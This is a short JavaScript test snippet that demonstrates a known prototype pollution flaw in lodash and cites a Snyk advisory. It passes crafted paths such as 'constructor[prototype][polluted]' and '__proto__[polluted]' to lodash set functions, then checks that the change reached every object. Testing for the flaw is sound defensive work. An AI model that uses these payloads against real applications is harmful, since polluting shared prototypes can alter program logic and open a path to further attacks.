// //https://security.snyk.io/vuln/SNYK-JS-LODASH-608086
// test("prototype pollution in lodash", () => {
  const lod = require("lodash");
  let obj = {};
console.log({}.polluted);
  lod.set(obj, "constructor[prototype][polluted]", "yes");
console.log({}.polluted);
  delete obj.__proto__.polluted; // deletes the property set by this pollution
//});

// test("prototype pollution in lodash", () => {
/*  const lod = require("lodash");
console.log({}.polluted);
  lod.setWith({}, "__proto__[polluted]", "yes");
console.log({}.polluted);*/
// });
